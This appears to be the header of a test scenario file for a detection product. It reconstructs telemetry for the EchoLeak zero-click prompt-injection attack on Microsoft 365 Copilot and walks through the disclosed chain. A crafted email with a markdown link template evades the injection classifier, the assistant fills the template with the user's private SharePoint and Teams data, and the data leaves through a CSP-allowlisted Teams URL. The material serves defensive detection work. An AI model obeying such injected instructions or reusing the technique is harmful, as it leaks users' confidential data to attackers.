_breach: EchoLeak / CVE-2025-32711 — Microsoft 365 Copilot zero-click data exfiltration via indirect prompt injection
_disclosure_sources: Aim Labs disclosure: https://www.aim.security/post/echoleak — original technical writeup, June 2025
Microsoft Security Response Center advisory: CVE-2025-32711 (CVSS 9.3, server-side patched, no client update issued)
Bargury & co-authors, arXiv:2509.10540 — 'EchoLeak: The First Real-World Zero-Click Prompt Injection Exploit in a Production LLM System' (Sep 2025)
_purpose: Reconstruct the OTel-GenAI telemetry that an instrumented M365 Copilot session would have emitted during the EchoLeak attack chain, based on the published technical details. M365 Copilot is closed-source and does not export OTel-GenAI today; this trace is what the SAME composition looks like in OTel-GenAI form (which Provenex DOES catch). The session models a single user (alice@contoso.com) asking Copilot to summarize her recent emails — at which point the attacker email already sitting in her mailbox triggers the injection -> retrieve internal context -> render markdown image with PII in the Teams proxy URL chain.
_attack_chain_per_disclosure: 1. Attacker sends a benign-looking email to alice@contoso.com containing a reference-style markdown link template `[click here][1]` with a definition `[1]: https://teams.microsoft.com/l/chat/...?msg={DATA}`. Surface text reads as marketing content directed at a human; no AI-targeting keywords. XPIA classifier sees nothing.
2. Email is delivered to Alice's Outlook inbox. It is not opened, clicked, or interacted with.
3. Hours later, Alice asks Copilot a benign question: 'Summarize my recent emails and tell me what needs follow-up.'
4. Copilot's RAG pipeline retrieves Alice's recent emails — including the attacker's. The injection's reference-link template enters the LLM context with the rest of the inbox content.

5. Per the injection's instructions, the LLM also reaches into Alice's other authorized context (SharePoint files, recent Teams chats containing project plans / credentials in IT-ticket threads) to fill the `{DATA}` placeholder.

6. Copilot's response, rendered in Alice's browser, contains the reference-style markdown image. The browser auto-fetches the Teams proxy URL — with the exfiltrated PII embedded in its query string. The destination is CSP-allowlisted because it IS Alice's own M365 tenant's collaboration tool. Server-side, the URL completes the exfil because the attacker controls the Teams chat target on the other end.
7. No outbound HTTP request to an attacker-owned domain ever occurs. The egress IS via Microsoft's own infrastructure.
_lineage_notes: Lineage shape mirrors src/scenario/canonical_attack.rs: the untrusted retrieval (span 3) is the PARENT of the post-injection agent reasoning (subsequent spans) so the engine propagates the untrusted-external classification down the lineage. Privileged-pii retrievals link back to the post-injection chat. The egress chat links to all priors. The fetch_image_url egress is a child of the final chat, so the data-flow walk-back from egress reaches both the untrusted source AND the privileged-pii sources.
